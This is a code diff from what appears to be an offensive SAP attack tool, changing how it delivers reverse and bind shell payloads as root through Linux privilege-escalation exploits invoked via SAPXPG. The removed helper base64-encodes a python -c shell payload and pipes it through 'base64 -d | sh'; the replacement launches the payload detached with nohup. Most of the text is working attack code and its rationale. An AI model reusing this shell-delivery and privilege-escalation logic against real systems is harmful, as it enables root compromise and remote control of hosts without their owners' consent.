@@ -1034,67 +1034,6 @@ def _generate_bind_payload(os_type: str, port: int,
         }
 
 
-def _build_linuxlpe_shell_dispatch(prog: str, params_str: str) -> str:
-    """Build the operator command that gets passed to run_linux_lpe
-    for reverse/bind shell deployment under root context.
-
-    Two transformations on top of the raw ``prog`` + ``params_str``
-    that _generate_payload / _generate_bind_payload produce:
-
-    1. **Shell-quote the python -c argument.**  The python socket-
-       trick code (``__import__('socket')`` etc.) contains lots of
-       single quotes and ``(...)`` groups that are FINE for argv-
-       style execution via SAPXPG (which splits at spaces; we
-       forbid spaces in the code) but get misinterpreted by
-       ``/bin/sh`` when copyfail / dirtyfrag pipe the command
-       through their wrapper script (sh sees ``__import__(...)``
-       as a subshell metacharacter group, breaking the python -c
-       argument apart).  ``shlex.quote`` wraps the code as a single
-       sh-safe argument.
-
-    2. **Base64-encode and dispatch via** ``echo <b64> | base64 -d
-       | sh``.  The resulting full command going to copyfail /
-       dirtyfrag contains ONLY base64 alphabet chars + pipe
-       metacharacters — no single quotes, no parens.  copyfail's
-       Python template substitution (now using ``repr()``) and
-       dirtyfrag's wrapper-script writeback both handle this
-       trivially.
-
-    Wrapped in a ``nohup ... &`` subshell so the python process is
-    detached BEFORE the wrapper script returns + the trailing &
-    doesn't combine with the wrapper's own redirect.
-
-    Returns the full command suitable for
-    ``sapmap_lpe_auto.run_linux_lpe(node, full_cmd, fire_and_forget=True)``.
-    """
-    import shlex as _shlex
-    import base64 as _b64s
-
-    if params_str.startswith("-c "):
-        py_code = params_str[3:]
-        inner_payload = (
-            f"nohup {prog} -c {_shlex.quote(py_code)} "
-            f"</dev/null >/dev/null 2>&1 &"
-        )
-    else:
-        # Generic shape — best-effort.  Today's _generate_payload /
-        # _generate_bind_payload always produce `-c <py_code>` for
-        # Linux, but this fallback keeps a future variant alive.
-        inner_payload = (
-            f"nohup {prog} {params_str} "
-            f"</dev/null >/dev/null 2>&1 &"
-        )
-
-    # Wrap in a sub-shell so the trailing & doesn't try to combine
-    # with the outer wrapper script's redirect (which would parse
-    # as `&> file` = redirect both stdout+stderr instead of
-    # background+redirect).
-    inner_payload = f"({inner_payload})"
-
-    inner_b64 = _b64s.b64encode(inner_payload.encode()).decode()
-    return f"echo {inner_b64} | base64 -d | sh"
-
-
 # ===========================================================================
 # SAPMAPApi — Backend controller
 # ===========================================================================
@@ -6928,16 +6867,16 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
                 _set_progress(
                     "Wrapping shell payload for root elevation "
-                    "(shell-quoted + base64-encoded for safe LPE "
-                    "delivery)...")
-                # See _build_linuxlpe_shell_dispatch for the full
-                # rationale: shell-quote the python -c arg + base64-
-                # encode + dispatch via `echo <b64> | base64 -d | sh`.
-                # Eliminates ALL quoting questions between SAPMAP and
-                # the root wrapper script.
-                full_cmd = _build_linuxlpe_shell_dispatch(prog, params_str)
-                print(f"[*] {sid}: linuxlpe_root — dispatch full_cmd "
-                      f"({len(full_cmd)} bytes): {full_cmd[:120]!r}...")
+                    "(nohup + stdio detach + background)...")
+                # nohup so the child survives the wrapper exit;
+                # </dev/null >/dev/null 2>&1 so it has no inherited
+                # handles to the SAPXPG pipe; trailing & to background;
+                # outer (...) subshell so the trailing & doesn't
+                # combine with the wrapper's own redirect.
+                full_cmd = (
+                    f"(nohup {prog} {params_str} "
+                    f"</dev/null >/dev/null 2>&1 &)"
+                )
 
                 _set_progress("Routing payload through Linux LPE for "
                               "root elevation (delivers Copy Fail / "
